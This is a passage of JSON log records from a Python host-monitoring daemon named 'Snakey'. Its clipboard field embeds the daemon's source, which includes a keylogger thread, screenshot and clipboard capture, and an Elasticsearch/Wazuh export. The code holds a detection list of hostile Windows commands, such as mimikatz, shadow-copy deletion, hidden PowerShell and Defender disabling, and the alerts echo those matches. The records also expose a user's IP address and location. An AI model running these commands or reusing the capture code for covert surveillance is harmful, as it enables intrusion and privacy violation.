hash_ledger_path})\r\n                except Exception as fallback_e:\r\n                    logger.error(f\"Failed to write hash ledger even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": hash_ledger_path})\r\n                    session_log[\"alerts\"].append(f\"CRITICAL: Failed to write hash ledger even with fallback: {fallback_e}\")\r\n\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            if merkle_root:\r\n                # Save the Merkle root (Atomic Write)\r\n                temp_merkle_path = os.path.join(base_path, \"merkle_root_temp.txt\")\r\n                try:\r\n                    with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f_merkle:\r\n                        temp_f_merkle.write(merkle_root)\r\n                    shutil.move(temp_f_merkle.name, merkle_root_path)\r\n                    logger.info(\"Merkle root saved (based on encrypted file hashes).\")\r\n                except Exception as e:\r\n                    logger.error(f\"Atomic write failed for Merkle root: {e}\", exc_info=True, extra={\"temp_path\": temp_merkle_path, \"target_path\": merkle_root_path})\r\n                    session_log[\"alerts\"].append(f\"Failed to save Merkle root atomically: {e}\")\r\n                    if os.path.exists(temp_f_merkle.name):\r\n                        os.remove(temp_f_merkle.name)\r\n                    # Fallback\r\n                    try:\r\n                        with open(merkle_root_path, \"w\", encoding='utf-8') as f:\r\n                            f.write(merkle_root)\r\n                        logger.warning(\"Merkle root updated with non-atomic write due to previous error.\", extra={\"target_path\": merkle_root_path})\r\n                    except Exception as fallback_e:\r\n                        logger.error(f\"Failed to write Merkle root even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": merkle_root_path})\r\n                        session_log[\"alerts\"].append(f\"CRITICAL: Failed to write Merkle root even with fallback: {fallback_e}\")\r\n            else:\r\n                logger.warning(\"Merkle root could not be built (no hashes).\")\r\n\r\n\r\n        except Exception as e:\r\n            logger.error(f\"Failed to update hash ledger or Merkle root: {e}\", exc_info=True)\r\n            session_log[\"alerts\"].append(f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        logger.error(f\"Encryption or encrypted file save error: {e}\", exc_info=True)\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    logger.info(\"Starting Snakey in daemon mode...\")\r\n\r\n    # Start keylogger in a separate, persistent daemon thread\r\n    keylogger_thread = threading.Thread(target=keylogger_thread_func, daemon=True)\r\n    keylogger_thread.start()\r\n    logger.info(\"Keylogger thread initialized.\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        logger.info(\"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            logger.error(f\"Failed to remove existing stop file: {e}\", exc_info=True)\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            logger.info(\"Snakey terminated by stop_snakey.txt file.\")\r\n            # Gracefully stop keylogger thread\r\n            if KEYLOGGER_LISTENER:\r\n                logger.info(\"Stopping keylogger listener.\")\r\n                KEYLOGGER_LISTENER.stop()\r\n            break # Exit main loop\r\n\r\n        try:\r\n            session_log = collect_full_session() # Gathers all data, encrypts, updates ledger\r\n\r\n            # Send data to Elasticsearch (if connected)\r\n            send_to_elasticsearch(session_log)\r\n\r\n            # Save data to local JSON log file\r\n            save_session_to_json(session_log, json_log_path)\r\n\r\n            # Log to Wazuh-compatible file\r\n            log_to_wazuh_file(session_log)\r\n\r\n        except Exception as e:\r\n            logger.critical(f\"An unhandled error occurred in the main daemon loop: {e}\", exc_info=True)\r\n            # No `extra` here, as this is the top-level handler\r\n            session_log[\"alerts\"].append(f\"CRITICAL: Unhandled error in main loop: {e}\") # Add to log if possible\r\n\r\n        # Sleep for the configured interval\r\n        logger.info(f\"Sleeping for {config['time_sleep_seconds']} seconds before next collection at {datetime.now(timezone.utc).isoformat()}...\")\r\n        time.sleep(config['time_sleep_seconds'])\r\n\r\n    logger.info(\"Snakey daemon has stopped.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7bc953bbeac424b0f7d619989809cc46fb5a20586088b9b928a23e5c1b18d547", "screenshot_hash": "937fba4d7993827a65f53d026bca13ca91bce0ecff144b1b6940a3dabe991f6c", "_raw_log_hash": "1f3f844023c9f6936af3334f1d380d90accabdfa92f681382d8988453752083f"}
{"timestamp": "2025-06-11T17:09:31.979179+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport sys\r\nimport threading\r\nimport shutil\r\nimport traceback\r\nimport logging\r\nfrom logging.handlers import RotatingFileHandler, TimedRotatingFileHandler\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get as requests_get, post as requests_post # Renamed to avoid conflict with `get` from `requests`\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Still needed for general requests like ipinfo.io\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException, TransportError\r\nimport ssl # Not directly used for client, but good to have\r\nimport tempfile # For atomic writes\r\n\r\n\r\n# === Configuration Loading ===\r\n# Default configuration values\r\nDEFAULT_CONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    \"known_countries\": [\"Portugal\"], # Example country for testing\r\n    \"known_vpn_ips\": [\"89.214.145.78\", \"123.45.67.89\"], # Example VPN IPs\r\n    \"elastic_host\": \"localhost\",\r\n    \"elastic_port\": 9200,\r\n    \"log_level\": \"INFO\", # DEBUG, INFO, WARNING, ERROR, CRITICAL\r\n    \"time_sleep_seconds\": 3, # Main daemon loop sleep interval\r\n    \"min_free_disk_mb\": 100, # Minimum free disk space to operate\r\n    \"vt_api_key\": None, # Should be loaded from ENV\r\n    \"elastic_user\": None, # Should be loaded from ENV\r\n    \"elastic_password\": None # Should be loaded from ENV\r\n}\r\n\r\n# --- Paths derived from config ---\r\n# These will be set after config is loaded\r\nconfig = {} # Placeholder, will be populated by load_config\r\n\r\n# --- Global Keylogger Variables ---\r\nKEYLOGGER_KEYS = []\r\nKEYLOGGER_LISTENER = None # Will hold the pynput Listener instance\r\nKEYLOGGER_STOP_EVENT = threading.Event() # To signal the keylogger thread to stop\r\n\r\n# === Logger Setup (using Python's logging module) ===\r\n# This needs to be set up early before any `logger.info` calls\r\nlogger = logging.getLogger('snakey_daemon')\r\n\r\nclass JsonFormatter(logging.Formatter):\r\n    \"\"\"Custom JSON formatter for structured logs.\"\"\"\r\n    def format(self, record):\r\n        log_record = {\r\n            \"timestamp\": datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),\r\n            \"level\": record.levelname,\r\n            \"message\": record.getMessage(),\r\n            \"logger_name\": record.name,\r\n        }\r\n        if record.exc_info:\r\n            log_record[\"exception\"] = self.formatException(record.exc_info)\r\n        if record.funcName:\r\n            log_record[\"function\"] = record.funcName\r\n        if record.lineno:\r\n            log_record[\"line\"] = record.lineno\r\n        if record.pathname:\r\n            log_record[\"file\"] = record.pathname\r\n        \r\n        # Add any extra dictionary fields passed to the logger via the 'extra' keyword\r\n        if hasattr(record, 'extra') and isinstance(record.extra, dict):\r\n            # The 'extra' dictionary contains the keys directly, so just update\r\n            log_record.update(record.extra)\r\n\r\n        return json.dumps(log_record, default=str) # default=str handles datetime, etc.\r\n\r\ndef setup_logging(log_level_str, log_file_path):\r\n    \"\"\"Configures the main logger for the daemon.\"\"\"\r\n    try:\r\n        logger.setLevel(getattr(logging, log_level_str.upper()))\r\n    except AttributeError:\r\n        logger.setLevel(logging.INFO) # Default to INFO if level is invalid\r\n        logger.warning(f\"Invalid SNAKEY_LOG_LEVEL '{log_level_str}'. Defaulting to INFO.\")\r\n\r\n    # Prevent adding handlers multiple times if setup_logging is called more than once\r\n    if not logger.handlers:\r\n        # File Handler with Time-based Rotation (daily)\r\n        file_handler = TimedRotatingFileHandler(log_file_path,\r\n                                                when=\"midnight\",\r\n                                                interval=1, # Rotate daily\r\n                                                backupCount=5) # Keep up to 5 rotated log files\r\n        file_handler.setLevel(logging.DEBUG) # Log all debug messages to file\r\n        file_handler.setFormatter(JsonFormatter())\r\n        logger.addHandler(file_handler)\r\n\r\n        # Console Handler\r\n        console_handler = logging.StreamHandler(sys.stdout)\r\n        console_handler.setLevel(logging.INFO) # Only INFO and above to console\r\n        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\r\n        console_handler.setFormatter(console_formatter)\r\n        logger.addHandler(console_handler)\r\n\r\n# Global exception handler to log any unhandled exceptions\r\ndef handle_unhandled_exception(exc_type, exc_value, exc_traceback):\r\n    if issubclass(exc_type, KeyboardInterrupt):\r\n        # Don't log KeyboardInterrupt, let default handler deal with it\r\n        sys.__excepthook__(exc_type, exc_value, exc_traceback)\r\n        return\r\n    logger.critical(\"Unhandled exception caught!\", exc_info=(exc_type, exc_value, exc_traceback))\r\n\r\nsys.excepthook = handle_unhandled_exception\r\n\r\ndef load_config(config_file_path: str) -> dict:\r\n    \"\"\"Loads configuration from a JSON file and environment variables.\"\"\"\r\n    loaded_config = DEFAULT_CONFIG.copy()\r\n\r\n    if os.path.exists(config_file_path):\r\n        try:\r\n            with open(config_file_path, \"r\", encoding='utf-8') as f:\r\n                file_config = json.load(f)\r\n                loaded_config.update(file_config)\r\n            logger.info(f\"Configuration loaded from {config_file_path}\")\r\n        except json.JSONDecodeError:\r\n            logger.error(f\"Error decoding config file {config_file_path}. Using default values.\")\r\n        except IOError as e:\r\n            logger.error(f\"Error reading config file {config_file_path}: {e}. Using default values.\")\r\n        except Exception as e:\r\n            logger.critical(f\"Unexpected error parsing config file: {e}\", exc_info=True)\r\n            sys.exit(1) # Critical error, exit\r\n\r\n    # Override with Environment Variables for sensitive info (best practice)\r\n    loaded_config[\"vt_api_key\"] = os.getenv(\"SNAKEY_VT_API_KEY\", loaded_config[\"vt_api_key\"])\r\n    loaded_config[\"elastic_user\"] = os.getenv(\"SNAKEY_ELASTIC_USER\", loaded_config[\"elastic_user\"])\r\n    loaded_config[\"elastic_password\"] = os.getenv(\"SNAKEY_ELASTIC_PASSWORD\", loaded_config[\"elastic_password\"])\r\n    loaded_config[\"log_level\"] = os.getenv(\"SNAKEY_LOG_LEVEL\", loaded_config[\"log_level\"]).upper()\r\n\r\n    return loaded_config\r\n\r\n# === Global Variables (Initialized after config loading) ===\r\nconfig_file = os.path.join(DEFAULT_CONFIG[\"base_path\"], \"snakey_config.json\")\r\nconfig = load_config(config_file)\r\n\r\n# Now define paths and settings using the loaded config\r\nbase_path = config[\"base_path\"]\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True) # Ensure directory exists\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon.log\") # Changed name to avoid conflict with existing (error) log\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = set(config[\"known_countries\"]) # Use set for faster lookups\r\nKNOWN_VPN_IPS = set(config[\"known_vpn_ips\"]) # Use set for faster lookups\r\nMIN_FREE_DISK_MB = config[\"min_free_disk_mb\"]\r\n\r\n# --- VirusTotal API Endpoints (Global Constants) ---\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\n\r\n\r\n# Sensitive Command Detection Configuration\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\", \"del /s /q\", \"rmdir /s /q\", \"net user\", \"net localgroup administrators\",\r\n    \"taskkill /f /im\", \"schtasks /create\", \"reg delete\", \"mimikatz\",\r\n    \"certutil -urlcache -f -split\", \"wmic shadowcopy delete\", \"vssadmin delete shadows\",\r\n    \"powershell -nop -w hidden -c\", \"invoke-expression\", \"set-mppreference -disablerealtimemonitoring $true\",\r\n    \"bcdedit /set {current} safeboot network\", \"mshta.exe http\", \"bitsadmin /transfer\",\r\n    \"wevtutil cl system\", \"cipher /w\", \"sdelete -z\",\r\n]\r\n\r\n# === Setup Logging (now that config is loaded) ===\r\nsetup_logging(config[\"log_level\"], daemon_log_file)\r\n\r\n\r\n# === Encryption Key Loading ===\r\nfernet: Fernet = None # Type hint\r\nif not os.path.exists(key_path):\r\n    logger.critical(\"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    sys.exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    logger.info(\"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    logger.critical(f\"Failed to load encryption key: {e}. Exiting.\", exc_info=True)\r\n    sys.exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = config[\"elastic_host\"]\r\nELASTIC_PORT = config[\"elastic_port\"]\r\nELASTIC_USER = config[\"elastic_user\"]\r\nELASTIC_PASSWORD = config[\"elastic_password\"]\r\n\r\nes_client: Elasticsearch = None # Type hint\r\n\r\n# Basic pre-check before initializing the full ES client\r\nes_precheck_successful = False\r\nlogger.info(\"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\nif not ELASTIC_USER or not ELASTIC_PASSWORD:\r\n    logger.critical(\"Elasticsearch username or password not set (check SNAKEY_ELASTIC_USER/SNAKEY_ELASTIC_PASSWORD environment variables or config file). Elasticsearch client will not be initialized.\")\r\nelse:\r\n    try:\r\n        response = requests_get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                                verify=False, timeout=10, stream=True)\r\n        logger.debug(f\"Basic requests.get status: {response.status_code}\")\r\n        # Read a byte to force connection establishment, then close to prevent hanging\r\n        try:\r\n            response.raw.read(1)\r\n        except Exception as read_e:\r\n            logger.warning(f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\", extra={\"error_type\": \"requests_raw_read_error\"})\r\n        response.close()\r\n        if response.status_code == 200:\r\n            logger.info(\"Basic requests.get pre-check successful (status 200).\")\r\n            es_precheck_successful = True\r\n        else:\r\n            logger.warning(\r\n                f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\",\r\n                extra={\"http_status\": response.status_code, \"response_text\": response.text})\r\n\r\n    except requests.exceptions.ConnectionError as e:\r\n        logger.error(f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\", exc_info=True, extra={\"error_type\": \"requests_connection_error\"})\r\n    except requests.exceptions.Timeout:\r\n        logger.error(\"requests.Timeout during pre-check: Connection timed out.\", exc_info=True, extra={\"error_type\": \"requests_timeout\"})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\", exc_info=True, extra={\"error_type\": \"requests_request_error\"})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during basic requests pre-check: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_precheck_error\"})\r\n\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # WARNING: Disable for testing, enable for production!\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            logger.info(\"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            logger.error(\"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\", extra={\"error_type\": \"es_ping_failed\"})\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        logger.error(f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        logger.error(f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        es_client = None\r\n    except TransportError as e:\r\n        logger.error(f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code})\r\n        es_client = None\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during Elasticsearch client initialization: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_init_error\"})\r\n        es_client = None\r\nelse:\r\n    logger.warning(\"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath: str) -> str | None:\r\n    \"\"\"Calculates the SHA256 hash of a file.\"\"\"\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        logger.error(f\"File not found for hashing: {filepath}\", extra={\"file_path\": filepath})\r\n        return None\r\n    except Exception as e:\r\n        logger.error(f\"Hashing failed for {filepath}: {e}\", exc_info=True, extra={\"file_path\": filepath})\r\n        return None\r\n\r\n\r\ndef hash_text(text: str) -> str:\r\n    \"\"\"Calculates the SHA256 hash of a given string.\"\"\"\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes: list[str]) -> str | None:\r\n    \"\"\"Builds a Merkle tree from a list of hashes and returns the Merkle root.\"\"\"\r\n    if not hashes:\r\n        return None\r\n    hashes = list(hashes) # Make a mutable copy\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url: str) -> dict:\r\n    \"\"\"Performs a VirusTotal URL lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping URL lookup.\", extra={\"url\": url})\r\n            return {}\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests_get(f\"{VT_URL_LOOKUP}{url_id}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\", extra={\"url_hash\": url_id})\r\n        else:\r\n            logger.warning(f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\", extra={\"url\": url, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT URL lookup failed: {e}\", exc_info=True, extra={\"url\": url})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT URL lookup: {e}\", exc_info=True, extra={\"url\": url})\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path: str) -> dict:\r\n    \"\"\"Performs a VirusTotal file lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping File lookup.\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        if not os.path.exists(file_path):\r\n            logger.error(f\"File not found for VT lookup: {file_path}\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:\r\n            return {}\r\n\r\n        response = requests_get(f\"{VT_FILE_LOOKUP}{file_hash}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\", extra={\"file_hash\": file_hash, \"file_path\": file_path})\r\n        else:\r\n            logger.warning(f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\", extra={\"file_path\": file_path, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT File lookup failed: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT File lookup: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    return {}\r\n\r\n\r\ndef check_important_directories() -> dict[str, str]:\r\n    \"\"\"Checks the status of important user directories.\"\"\"\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n                logger.warning(f\"Failed to list contents of {name} ({path}): {e}\", extra={\"dir_name\": name, \"dir_path\": path})\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file() -> bool:\r\n    \"\"\"Checks if the 'stop_snakey.txt' file exists to terminate the daemon.\"\"\"\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef check_disk_space(path: str, min_free_mb: int) -> bool:\r\n    \"\"\"Checks if there's enough free disk space at a given path.\"\"\"\r\n    try:\r\n        total, used, free = shutil.disk_usage(path)\r\n        free_mb = free / (1024 * 1024)\r\n        if free_mb < min_free_mb:\r\n            logger.warning(f\"Low disk space detected in {path}: {free_mb:.2f} MB free. Operations might be impacted.\", extra={\"path\": path, \"free_mb\": free_mb, \"min_free_mb\": min_free_mb})\r\n            return False\r\n        logger.debug(f\"Disk space OK in {path}: {free_mb:.2f} MB free.\")\r\n        return True\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check disk space for {path}: {e}\", exc_info=True, extra={\"path\": path})\r\n        return True # Assume OK if check fails, to avoid halting the daemon\r\n\r\ndef log_to_wazuh_file(data: dict):\r\n    \"\"\"Logs session data to a file in a Wazuh-compatible JSON format.\"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(data, default=str) + \"\\n\")\r\n        logger.info(\"Log written to Wazuh-compatible file.\", extra={\"log_file\": wazuh_log_file})\r\n    except Exception as e:\r\n        logger.error(f\"Wazuh log file write failed: {e}\", exc_info=True, extra={\"log_file\": wazuh_log_file})\r\n\r\ndef save_session_to_json(session_data: dict, filepath: str):\r\n    \"\"\"\r\n    Appends session data as a new JSON object to the specified file.\r\n    Each object is on a new line to make it easier to read/parse as NDJSON.\r\n    \"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in session_data and isinstance(session_data['timestamp'], datetime):\r\n            session_data['timestamp'] = session_data['timestamp'].isoformat()\r\n        \r\n        with open(filepath, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(session_data, default=str) + \"\\n\")\r\n        logger.info(f\"Session log appended to JSON file: {filepath}\", extra={\"log_file\": filepath})\r\n    except Exception as e:\r\n        logger.error(f\"Failed to write session log to JSON file {filepath}: {e}\", exc_info=True, extra={\"log_file\": filepath})\r\n\r\ndef send_to_elasticsearch(data: dict):\r\n    \"\"\"Sends collected session data to Elasticsearch.\"\"\"\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty for Kibana visualization (empty list is fine, None is bad)\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []\r\n            if not data_to_send.get('virustotal'):\r\n                data_to_send['virustotal'] = {}\r\n\r\n            logger.debug(f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\", extra={\"timestamp\": data_to_send['timestamp']})\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            logger.info(f\"Log sent to Elasticsearch. ID: {response['_id']}\", extra={\"es_id\": response['_id']})\r\n        except ConnectionError as e:\r\n            logger.error(f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        except 